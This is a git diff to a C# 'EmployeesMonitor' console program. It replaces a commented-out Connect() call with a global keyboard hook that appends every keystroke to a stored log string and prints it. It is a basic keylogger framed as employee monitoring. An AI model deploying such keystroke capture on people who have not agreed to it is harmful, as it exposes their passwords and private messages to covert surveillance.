@@ -1,6 +1,9 @@
 ﻿using EmpoleeysMonitor.Lib;
 using EmpoleeysMonitor.Lib.Monitor.File;
+using Keystroke.API;
 using System;
+using System.Windows.Forms;
+using SaveToFile;
 
 namespace EmployeesMonitor
 {
@@ -20,9 +23,24 @@ namespace EmployeesMonitor
             MouseMonitorClass.UnhookWindowsHookEx(MouseMonitorClass._hookID);
             Console.ReadKey();//push1*/
 
-            Console.ReadKey();
 
-            Connect();
+            //Console.ReadKey();
+            //Connect();
+
+
+            using (var api = new KeystrokeAPI())
+            {
+
+                api.CreateKeyboardHook((character) =>
+                {
+                    MyStorage.logStorage += character;
+                    Console.WriteLine(MyStorage.logStorage);
+
+                });
+
+
+                Application.Run();
+            }
         }
 
         public static void Connect()
